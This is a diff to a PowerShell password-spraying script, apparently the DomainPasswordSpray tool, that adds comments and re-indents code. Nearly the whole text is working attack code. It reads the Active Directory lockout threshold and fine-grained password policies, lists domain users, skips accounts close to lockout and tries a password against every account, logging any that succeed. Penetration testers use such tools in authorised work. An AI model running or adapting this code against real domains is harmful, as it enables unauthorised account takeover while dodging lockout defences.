@@ -1,4 +1,4 @@
-function Invoke-DomainPasswordSpray{
+﻿function Invoke-DomainPasswordSpray{
     <#
     .SYNOPSIS
 
@@ -105,11 +105,12 @@ function Invoke-DomainPasswordSpray{
         }
     }
 
-
+    #Setting the current domain's account lockout threshold
     $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
     $AccountLockoutThresholds = @()
     $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold
 
+    #Getting the AD behavior version to determine if fine-grained password policies are possible
     $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
     if ($behaviorversion -ge 3)
     {
@@ -125,11 +126,13 @@ function Invoke-DomainPasswordSpray{
             Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
             foreach($entry in $PSOs)
             {
+                #Selecting the lockout threshold, min pwd length, and which groups the fine-grained password policy applies to
                 $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                 $PSOPolicyName = $PSOFineGrainedPolicy.name
                 $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                 $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                 $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
+                #adding lockout threshold to array for use later to determine which is the lowest.
                 $AccountLockoutThresholds += $PSOLockoutThreshold
 
             Write-Output "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
@@ -145,92 +148,96 @@ function Invoke-DomainPasswordSpray{
         $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
         [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
 
-If ($UserList -eq "") 
-{
-    #Generate a userlist from the domain
-    #Selecting the lowest account lockout threshold in the domain to avoid locking out any accounts. 
-    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
-    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
-    Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
-    
-    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
-    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
-    $UserSearcher.SearchRoot = $DirEntry
-
-    $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
-    $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
-    $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
-    #samAccountType of 805306368 only returns valid user objects.
-    $UserSearcher.filter = "(samAccountType=805306368)"
-    $AllUserObjects = $UserSearcher.FindAll()
-    $UserListArray = @()
-    Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out via this threshold."
-    Foreach ($user in $AllUserObjects)
+    If ($UserList -eq "") 
     {
-        $badcount = $user.Properties.badpwdcount
-        $samaccountname = $user.Properties.samaccountname
-        $badpasswordtime = $user.Properties.badpasswordtime[0]
-        
-        $currenttime = Get-Date
-        $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
-        $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
+        #Generate a userlist from the domain
+        #Selecting the lowest account lockout threshold in the domain to avoid locking out any accounts. 
+        [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
+        Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
+        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
+    
+        $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
+        $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
+        $UserSearcher.SearchRoot = $DirEntry
 
-        if ($badcount)
+        $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
+        $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
+        $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
+        #samAccountType of 805306368 only returns valid user objects.
+        $UserSearcher.filter = "(samAccountType=805306368)"
+        $AllUserObjects = $UserSearcher.FindAll()
+        $UserListArray = @()
+        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out via this threshold."
+        Foreach ($user in $AllUserObjects)
         {
-            [int]$userbadcount = [convert]::ToInt32($badcount, 10)
-            $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
-            if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+            #Getting bad password counts and lst bad password time for each user
+            $badcount = $user.Properties.badpwdcount
+            $samaccountname = $user.Properties.samaccountname
+            $badpasswordtime = $user.Properties.badpasswordtime[0]
+        
+            $currenttime = Get-Date
+            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
+            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
+
+            if ($badcount)
             {
-                $UserListArray += $samaccountname
+                
+                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
+                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
+                #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
+                if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+                {
+                    $UserListArray += $samaccountname
+                }
             }
         }
+            Write-Host -foregroundcolor "yellow" ("[*] Using a userlist containing " + $UserListArray.count + " users gathered from the current user's domain to spray with")
     }
-        Write-Host -foregroundcolor "yellow" ("[*] Using a userlist containing " + $UserListArray.count + " users gathered from the current user's domain to spray with")
-}
-else
-{
-    Write-Host "[*] Using $UserList as userlist to spray with"
-    Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
-    Start-Sleep 5
-    $UserListArray = @()
-    try 
+    else
     {
-        $UserListArray = Get-Content $UserList -ErrorAction stop
-    }
-    catch [Exception]{
-        Write-Host -ForegroundColor "red" "$_.Exception"
-        break
-    }
+        #if a Userlist is specified use it and do not check for lockout thresholds
+        Write-Host "[*] Using $UserList as userlist to spray with"
+        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
+        Start-Sleep 5
+        $UserListArray = @()
+        try 
+        {
+            $UserListArray = Get-Content $UserList -ErrorAction stop
+        }
+        catch [Exception]{
+            Write-Host -ForegroundColor "red" "$_.Exception"
+            break
+        }
     
-}
+    }
 
-        # If a single password is selected do this
+    # If a single password is selected do this
     if ($Password)
     {
-    $time = Get-Date
-    Write-Host -ForegroundColor Yellow "[*] Password spraying has started. Current time is $($time.ToShortTimeString())"
-    Write-Host "[*] This might take a while depending on the total number of users"
-    $curr_user = 0
-    $count = $UserListArray.count
+        $time = Get-Date
+        Write-Host -ForegroundColor Yellow "[*] Password spraying has started. Current time is $($time.ToShortTimeString())"
+        Write-Host "[*] This might take a while depending on the total number of users"
+        $curr_user = 0
+        $count = $UserListArray.count
 
-    ForEach($User in $UserListArray){
-    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-        If ($Domain_check.name -ne $null)
-        {
-            if ($OutFile -ne "")
-            {    
-                Add-Content $OutFile $User`:$Password
+        ForEach($User in $UserListArray){
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+            If ($Domain_check.name -ne $null)
+            {
+                if ($OutFile -ne "")
+                {    
+                    Add-Content $OutFile $User`:$Password
+                }
+            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
             }
-        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+            $curr_user+=1 
+            Write-Host -nonewline "$curr_user of $count users tested`r"
+            }
+        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+        if ($OutFile -ne "")
+        {
+        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
         }
-        $curr_user+=1 
-        Write-Host -nonewline "$curr_user of $count users tested`r"
-        }
-    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-    if ($OutFile -ne "")
-    {
-    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-    }
     }
         # If a password list is selected do this
     ElseIf($PasswordList){
@@ -288,4 +295,3 @@ Function Countdown-Timer
     }
     Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
-
